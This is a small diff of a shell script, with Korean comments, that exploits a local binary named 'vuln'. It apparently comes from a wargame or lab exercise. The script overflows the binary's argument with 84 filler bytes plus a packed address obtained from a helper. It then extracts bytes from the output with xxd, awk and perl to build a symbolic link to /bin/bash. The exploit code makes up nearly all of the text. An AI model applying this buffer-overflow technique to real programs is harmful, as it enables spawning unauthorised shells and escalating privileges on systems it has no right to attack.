@@ -22,7 +22,6 @@ sysaddr=$(./getaddr) //주소 구한 뒤 저장
 
 ./vuln "$(perl -e 'print "A"x84 . pack("V", hex("$(<sysaddr)"))')" 2> arg //주소 변환하고 vuln에 인자로 넣어서 실행한 뒤 출력값 저장
 
-
 xxd arg | awk '{for(i=2; i<=NF; i++) {if ($i == "3a20") {print $(i-1); print $i; print $(i+1); print $(i+2); print $(i+3); print $(i+4); print $(i+5); print $(i+6);}}' | perl -pe 's/(..)(..)(..)(..)/\\x$4\\x$3\\x$2\\x$1/g'
 //arg에서 원하는 부분 추출해 /bin/bash를 가리키는 심볼릭 링크 생성에 사용
 
